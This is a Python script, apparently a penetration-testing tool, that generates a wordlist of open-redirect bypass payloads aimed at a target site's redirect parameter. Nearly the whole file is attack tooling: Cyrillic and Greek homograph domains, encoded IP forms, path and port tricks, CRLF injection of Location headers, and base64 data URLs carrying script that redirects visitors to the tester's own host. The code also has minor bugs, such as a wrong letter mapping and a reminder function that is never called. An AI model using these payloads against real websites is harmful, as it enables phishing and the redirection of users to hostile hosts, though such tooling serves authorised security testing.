#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import ipaddress
from socket import inet_aton
from base64 import b64encode

def load_wordlist(wordlist):
    '''Loading the given wordlist to a list.'''
    list = []
    with open(wordlist,'r',encoding='utf-8') as f:
        for line in f:
            list.append(line.rstrip())
    return list


def right_to_left_rewrite(string_to_rewrite):
    return string_to_rewrite[::-1]


def encode_all(string):
    return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)


def make_unicode_normalization(hostname):
    '''Create a hostname with encircled chars for homograph attack and unicode normalization testing.'''
    encircled_numbers = ['\u24ff','\u2776','\u2777','\u2778','\u2779','\u277a','\u277b','\u277c','\u277d','\u277e']
    encircled_letters = ['Ⓐ','Ⓑ','Ⓒ','Ⓓ','Ⓔ','Ⓕ','Ⓖ','Ⓗ','Ⓘ','Ⓙ','Ⓚ','Ⓛ','Ⓜ','Ⓝ','Ⓞ','Ⓟ','Ⓠ','Ⓡ','Ⓢ','Ⓣ','Ⓤ','Ⓥ','Ⓦ','Ⓧ','Ⓨ','Ⓩ']

    if '0' in hostname:
        hostname = hostname.replace('0',encircled_numbers[0])
    
    if '1' in hostname:
        hostname = hostname.replace('1',encircled_numbers[1])

    if '2' in hostname:
        hostname = hostname.replace('2',encircled_numbers[2])

    if '3' in hostname:
        hostname = hostname.replace('3',encircled_numbers[3])

    if '4' in hostname:
        hostname = hostname.replace('4',encircled_numbers[4])

    if '5' in hostname:
        hostname = hostname.replace('5',encircled_numbers[5])

    if '6' in hostname:
        hostname = hostname.replace('6',encircled_numbers[6])

    if '7' in hostname:
        hostname = hostname.replace('7',encircled_numbers[7])

    if '8' in hostname:
        hostname = hostname.replace('8',encircled_numbers[8])

    if '9' in hostname:
        hostname = hostname.replace('9',encircled_numbers[9])

    if '.' in hostname:
        hostname = hostname.replace('.','｡')
    
    if 'a' in hostname:
        hostname = hostname.replace('a',encircled_letters[0])

    if 'b' in hostname:
        hostname = hostname.replace('b',encircled_letters[1])

    if 'c' in hostname:
        hostname = hostname.replace('c',encircled_letters[2])

    if 'd' in hostname:
        hostname = hostname.replace('d',encircled_letters[3])

    if 'e' in hostname:
        hostname = hostname.replace('e',encircled_letters[4])

    if 'f' in hostname:
        hostname = hostname.replace('f',encircled_letters[5])

    if 'g' in hostname:
        hostname = hostname.replace('g',encircled_letters[6])

    if 'h' in hostname:
        hostname = hostname.replace('h',encircled_letters[7])

    if 'i' in hostname:
        hostname = hostname.replace('i',encircled_letters[8])

    if 'j' in hostname:
        hostname = hostname.replace('j',encircled_letters[9])

    if 'k' in hostname:
        hostname = hostname.replace('k',encircled_letters[10])

    if 'l' in hostname:
        hostname = hostname.replace('l',encircled_letters[11])
    
    if 'm' in hostname:
        hostname = hostname.replace('m',encircled_letters[12])
    
    if 'n' in hostname:
        hostname = hostname.replace('n',encircled_letters[13])

    if 'o' in hostname:
        hostname = hostname.replace('o',encircled_letters[14])

    if 'p' in hostname:
        hostname = hostname.replace('p',encircled_letters[15])

    if 'q' in hostname:
        hostname = hostname.replace('q',encircled_letters[16])

    if 'r' in hostname:
        hostname = hostname.replace('r',encircled_letters[17])

    if 's' in hostname:
        hostname = hostname.replace('s',encircled_letters[17])

    if 't' in hostname:
        hostname = hostname.replace('t',encircled_letters[19])

    if 'u' in hostname:
        hostname = hostname.replace('u',encircled_letters[20])

    if 'v' in hostname:
        hostname = hostname.replace('v',encircled_letters[21])

    if 'w' in hostname:
        hostname = hostname.replace('w',encircled_letters[22])

    if 'x' in hostname:
        hostname = hostname.replace('x',encircled_letters[23])

    if 'y' in hostname:
        hostname = hostname.replace('y',encircled_letters[24])

    if 'z' in hostname:
        hostname = hostname.replace('z',encircled_letters[25])

    return hostname


def convert_ipv4_to_ipv6(vps_ip):
    '''Convert IPV4 to IPV6.'''
    return '['+str(ipaddress.IPv6Address('::'+vps_ip))+']'


def convert_ipv4_to_integer(vps_ip):
    '''Convert IPV4 to integer.'''
    return str(int(ipaddress.IPv4Address(vps_ip)))


def convert_ipv4_to_octal(vps_ip):
    '''Convert IPV4 to octal.'''
    return '.'.join(["%04o" % int(x) for x in vps_ip.split('.')])


def convert_ipv4_to_hex(vps_ip):
    '''Convert IPV4 to hex.'''
    return '0x'+inet_aton(vps_ip).hex()


def convert_ipv4_to_hex_with_dots(vps_ip):
    '''Convert IPV4 to hex with dots.'''
    return '.'.join([str(hex(int(x))) for x in vps_ip.split('.')])


def prepare_hosts(domain_collab,vps_ip,whitelisted_domain):
    '''Core of the payloads with common bypasses.'''
    cores = []
    cores.append(domain_collab)
    cores.append(vps_ip)
    
    cores.append(make_unicode_normalization(domain_collab))
    cores.append(make_unicode_normalization(vps_ip))

    cores.append(domain_collab+'#'+whitelisted_domain)
    cores.append(domain_collab+'#.'+whitelisted_domain)
    cores.append(domain_collab+'?'+whitelisted_domain)
    cores.append(domain_collab+'?.'+whitelisted_domain)
    cores.append(domain_collab+'/'+whitelisted_domain)
    cores.append(domain_collab+'/.'+whitelisted_domain)
    cores.append(domain_collab+'%00'+whitelisted_domain)
    cores.append(domain_collab+'%00.'+whitelisted_domain)
    cores.append(domain_collab+'%01'+whitelisted_domain)
    cores.append(domain_collab+'%01.'+whitelisted_domain)
    cores.append(domain_collab+'%09'+whitelisted_domain)
    cores.append(domain_collab+'%09.'+whitelisted_domain)
    cores.append(domain_collab+'%ff'+whitelisted_domain)
    cores.append(domain_collab+'%ff.'+whitelisted_domain)
    
    cores.append(whitelisted_domain+'.'+domain_collab)
    cores.append(whitelisted_domain+'.'+vps_ip)

    #These payloads will not trigger OOB interatcion. - check manually
    cores.append(whitelisted_domain+domain_collab)
    cores.append(domain_collab+whitelisted_domain)
    cores.append(whitelisted_domain+vps_ip)
    cores.append(vps_ip+whitelisted_domain)
    #---
    
    cores.append(convert_ipv4_to_ipv6(vps_ip))
    cores.append(convert_ipv4_to_integer(vps_ip))
    cores.append(convert_ipv4_to_octal(vps_ip))
    cores.append(convert_ipv4_to_hex(vps_ip))
    cores.append(convert_ipv4_to_hex_with_dots(vps_ip))

    return cores


def make_domain_homograph(domain_collab):
    '''Create a domain with cytrylic and greek chars for homograph attack and unicode normalization testing.'''
    cyrylic_chars = ['\u0423','\u0430','\u0432','\u0435','\u043C','\u043D','\u043E','\u0440','\u0441','\u0442','\u0445','\u0455','\u0456','\u0458']
    greek_chars = ['\u03BA','\u03BD','\u03C5']
    
    if 'y' in domain_collab:
        domain_collab = domain_collab.replace('y',cyrylic_chars[0])

    if 'a' in domain_collab:
        domain_collab = domain_collab.replace('a',cyrylic_chars[1])

    if 'b' in domain_collab:
        domain_collab = domain_collab.replace('b',cyrylic_chars[2])

    if 'e' in domain_collab:
        domain_collab = domain_collab.replace('e',cyrylic_chars[3])

    if 'm' in domain_collab:
        domain_collab = domain_collab.replace('m',cyrylic_chars[4])   

    if 'h' in domain_collab:
        domain_collab = domain_collab.replace('h',cyrylic_chars[5])

    if 'o' in domain_collab:
        domain_collab = domain_collab.replace('o',cyrylic_chars[6])
    
    if 'p' in domain_collab:
        domain_collab = domain_collab.replace('p',cyrylic_chars[7])

    if 'c' in domain_collab:
        domain_collab = domain_collab.replace('c',cyrylic_chars[8])

    if 't' in domain_collab:
        domain_collab = domain_collab.replace('t',cyrylic_chars[9])

    if 'x' in domain_collab:
        domain_collab = domain_collab.replace('x',cyrylic_chars[10])

    if 's' in domain_collab:
        domain_collab = domain_collab.replace('s',cyrylic_chars[11])

    if 'i' in domain_collab:
        domain_collab = domain_collab.replace('i',cyrylic_chars[12])

    if 'j' in domain_collab:
        domain_collab = domain_collab.replace('j',cyrylic_chars[13])

    if 'k' in domain_collab:
        domain_collab = domain_collab.replace('k',greek_chars[0])

    if 'v' in domain_collab:
        domain_collab = domain_collab.replace('v',greek_chars[1])

    if 'u' in domain_collab:
        domain_collab = domain_collab.replace('u',greek_chars[2])

    return domain_collab


def make_dot_bypass_payloads(host):
    '''Ideographic full stop char https://www.utf8-chartable.de/unicode-utf8-table.pl?start=12288&number=128'''
    dot_bypass_payloads = []
    dot_bypass_payloads.append('http://'+host.replace('.','。'))
    dot_bypass_payloads.append('https://'+host.replace('.','。'))
    dot_bypass_payloads.append('//'+host.replace('.','。'))
    dot_bypass_payloads.append(host.replace('.','。'))
    dot_bypass_payloads.append('http://'+host.replace('.','%E3%80%82'))
    dot_bypass_payloads.append('https://'+host.replace('.','%E3%80%82'))
    dot_bypass_payloads.append('//'+host.replace('.','%E3%80%82'))
    dot_bypass_payloads.append(host.replace('.','%E3%80%82'))
    return dot_bypass_payloads


def make_port_bypass_payloads(host):
    '''Bypassing the validator with port delimeter and @ char.'''
    port_bypass_payloads = []
    port_bypass_payloads.append(':80@' + host)
    port_bypass_payloads.append(':443@' + host)
    return(port_bypass_payloads)


def make_path_bypass_payloads(host):
    '''Bypassing the validator with additionall path at the end.'''
    path_bypass_payloads = []
    path_bypass_payloads.append(host + '/')
    path_bypass_payloads.append(host + '//')
    path_bypass_payloads.append(host + '/.')
    path_bypass_payloads.append(host + '/..')
    path_bypass_payloads.append(host + '/../')
    path_bypass_payloads.append(host + '/...')
    path_bypass_payloads.append(host + '/.../')
    path_bypass_payloads.append(host + '%2f%2e%2e%2f')
    path_bypass_payloads.append(host + '/%2e%2e%2f')
    path_bypass_payloads.append(host + '/%2f..')
    path_bypass_payloads.append(host + '\\')
    path_bypass_payloads.append(host + '\\.')
    path_bypass_payloads.append(host + '\\..')
    path_bypass_payloads.append(host + '\\..\\')
    path_bypass_payloads.append(host + '%5c.')
    path_bypass_payloads.append(host + '%5c')
    path_bypass_payloads.append(host + '%5c%5c%2e%2e%5c%5c')
    path_bypass_payloads.append('http://' + host + '/')
    path_bypass_payloads.append('http://' + host + '//')
    path_bypass_payloads.append('http://' + host + '/.')
    path_bypass_payloads.append('http://' + host + '/..')
    path_bypass_payloads.append('http://' + host + '/../')
    path_bypass_payloads.append('http://' + host + '/...')
    path_bypass_payloads.append('http://' + host + '/.../')
    path_bypass_payloads.append('http://' + host + '%2f%2e%2e%2f')
    path_bypass_payloads.append('http://' + host + '/%2e%2e%2f')
    path_bypass_payloads.append('http://' + host + '/%2f..')
    path_bypass_payloads.append('http://' + host + '\\')
    path_bypass_payloads.append('http://' + host + '\\.')
    path_bypass_payloads.append('http://' + host + '\\..')
    path_bypass_payloads.append('http://' + host + '\\..\\')
    path_bypass_payloads.append('http://' + host + '%5c.')
    path_bypass_payloads.append('http://' + host + '%5c')
    path_bypass_payloads.append('http://' + host + '%5c%5c%2e%2e%5c%5c')
    path_bypass_payloads.append('https://' + host + '/')
    path_bypass_payloads.append('https://' + host + '//')
    path_bypass_payloads.append('https://' + host + '/.')
    path_bypass_payloads.append('https://' + host + '/..')
    path_bypass_payloads.append('https://' + host + '/../')
    path_bypass_payloads.append('https://' + host + '/...')
    path_bypass_payloads.append('https://' + host + '/.../')
    path_bypass_payloads.append('https://' + host + '%2f%2e%2e%2f')
    path_bypass_payloads.append('https://' + host + '/%2e%2e%2f')
    path_bypass_payloads.append('https://' + host + '/%2f..')
    path_bypass_payloads.append('https://' + host + '\\')
    path_bypass_payloads.append('https://' + host + '\\.')
    path_bypass_payloads.append('https://' + host + '\\..')
    path_bypass_payloads.append('https://' + host + '\\..\\')
    path_bypass_payloads.append('https://' + host + '%5c.')
    path_bypass_payloads.append('https://' + host + '%5c')
    path_bypass_payloads.append('https://' + host + '%5c%5c%2e%2e%5c%5c')
    return(path_bypass_payloads)


def make_location_header_payload(domain_collab):
    location_payloads = []
    location_payloads.append('&%0d%0aLocation:http://' + domain_collab)
    location_payloads.append('&%0d%0aLocation:https://' + domain_collab)
    location_payloads.append('&%0dLocation:http://' + domain_collab)
    location_payloads.append('&%0dLocation:https://' + domain_collab)
    location_payloads.append('&%0aLocation:http://' + domain_collab)
    location_payloads.append('&%0aLocation:https://' + domain_collab)
    location_payloads.append('&%0a%0dLocation:http://' + domain_collab)
    location_payloads.append('&%0a%0dLocation:https://' + domain_collab)
    return location_payloads
    

def make_data_bypass_payloads(host):
    '''Base64 encoded location redirection.'''
    data_payloads = []
    data_payloads.append((b'data:text/html;base64,'+ b64encode(b'<script>location="http://'+str.encode(host)+b'"</script>')).decode())
    data_payloads.append((b'data:text/html;base64,'+ b64encode(b'<script>location="https://'+str.encode(host)+b'"</script>')).decode())
    return data_payloads


def make_url_encoding_bypass_payloads(host):
    '''Simple URL encoded paylaods'''
    url_erncoded = []
    url_erncoded.append(encode_all(host))
    url_erncoded.append(encode_all(encode_all(host)))
    url_erncoded.append(encode_all((encode_all(encode_all(host)))))
    url_erncoded.append(encode_all('http://'+host))
    url_erncoded.append(encode_all(encode_all('http://'+host)))
    url_erncoded.append(encode_all((encode_all(encode_all('http://'+host)))))
    url_erncoded.append(encode_all('https://'+host))
    url_erncoded.append(encode_all(encode_all('https://'+host)))
    url_erncoded.append(encode_all((encode_all(encode_all('https://'+host)))))
    url_erncoded.append('http://'+encode_all(host))
    url_erncoded.append('http://'+encode_all(encode_all(host)))
    url_erncoded.append('http://'+encode_all((encode_all(encode_all(host)))))
    url_erncoded.append('https://'+encode_all(host))
    url_erncoded.append('https://'+encode_all(encode_all(host)))
    url_erncoded.append('https://'+encode_all((encode_all(encode_all(host)))))
    return url_erncoded
    

def reminder_referer_based(whitelisted_domain):
    '''Remind the user to test the Referer-based OR.'''
    print('Remembmer to test the REFERER BASED OPEN REDIRECT.\nHost this on your VPS():\n<html><a href="https://'+whitelisted_domain+'/login">Click on this link!</a></html>)\nChange the /login to the target endpoint.')


def main():
    whitelisted_domain = sys.argv[1]
    domain_collab = sys.argv[2]
    vps_ip = sys.argv[3]
    redirect_parameter_name = sys.argv[4]
    schemes = load_wordlist('schemes.txt') # For example http:
    delimeters = load_wordlist('delimeters.txt') # For example //

    ### MAKING PAYLOADS
    open_redirection_wordlist = []
    # Right to Left Override #https://WHITELISTED.TLD/redirect.php?redirect=%40%E2%80%AE@moc.enifa.www
    open_redirection_wordlist.append('%40%E2%80%AE@' + right_to_left_rewrite(domain_collab))
    open_redirection_wordlist.append('%40%E2%80%AE@' + right_to_left_rewrite(vps_ip))
    # Parameter pollution #https://WHITELISTED.TLD/redirect.php?redirect=?next=WHITELISTED.TLD&next=www.afine.com
    open_redirection_wordlist.append(whitelisted_domain + '&' + redirect_parameter_name + '=' + domain_collab)
    open_redirection_wordlist.append(whitelisted_domain + '&' + redirect_parameter_name + '=' + vps_ip)
    # Ideographic full stop char www。afine。com
    open_redirection_wordlist+=make_dot_bypass_payloads(domain_collab)
    open_redirection_wordlist+=make_dot_bypass_payloads(vps_ip)
    # Homograph attack (cyrylic and greek)
    open_redirection_wordlist.append(make_domain_homograph(domain_collab))
    # Port bypass payloads :80@afine.com
    open_redirection_wordlist+=make_port_bypass_payloads(domain_collab)
    open_redirection_wordlist+=make_port_bypass_payloads(vps_ip)
    # Path bypass payloads 
    open_redirection_wordlist+=make_path_bypass_payloads(domain_collab)
    open_redirection_wordlist+=make_path_bypass_payloads(vps_ip)
    # Location header payload
    open_redirection_wordlist+=make_location_header_payload(domain_collab)
    # Data: location bypass payload
    open_redirection_wordlist+=make_data_bypass_payloads(domain_collab)
    open_redirection_wordlist+=make_data_bypass_payloads(vps_ip)
    # URL encoding bypass
    open_redirection_wordlist+=make_url_encoding_bypass_payloads(domain_collab)

    # Append custom payloads from unique_payloads.txt file.
    with open('unique_payloads.txt','r',encoding='utf-8') as f:
        open_redirection_wordlist.append(f.readline())
    # Prepare hosts - core for the next step.
    cores = prepare_hosts(domain_collab,vps_ip,whitelisted_domain)
    # Combine schemes, delimeters and cores to make a wordlist.
    for scheme in schemes:
        for delimeter in delimeters:
            for core in cores:
                open_redirection_wordlist.append(scheme+delimeter+core)
    # Remove duplicates entries to store only unique payloads
    open_redirection_wordlist = list(dict.fromkeys(open_redirection_wordlist))
    
    # Save the wordlist as 'OR.txt'
    with open('OR.txt','w') as f:
        for line in open_redirection_wordlist:
            f.write(line+'\n')

    # Remind the user of other manual bypasses.
    reminder_referer_based


if __name__ == '__main__':
    try:
        main()
    except:
        print('USAGE:\ncrimson_redirectOR.py whitelisted_domain domain_collab vps_ip redirect_parameter_name\n')
        print('\twhitelisted_domain - An original, valid domain that passes the validation. (You can try without and with /path endpoint if needed.')
        print('\tdomain_collab - Your HTTP&&HTTPS&&DNS listener.')
        print('\tvps_ip - Your VPS IP address with running on port 80 and 443 HTTP server.')
        print('\tredirect_parameter_name - The redirect parameter.')
        print('\nEXAMPLES:')
        print('\tcrimson_redirectOR.py whitelisted.com/test.aspx afine.com 123.123.123.123 redirect_uri')
        print('\tcrimson_redirectOR.py whitelisted.com afine.com 123.123.123.123 redirect_uri')

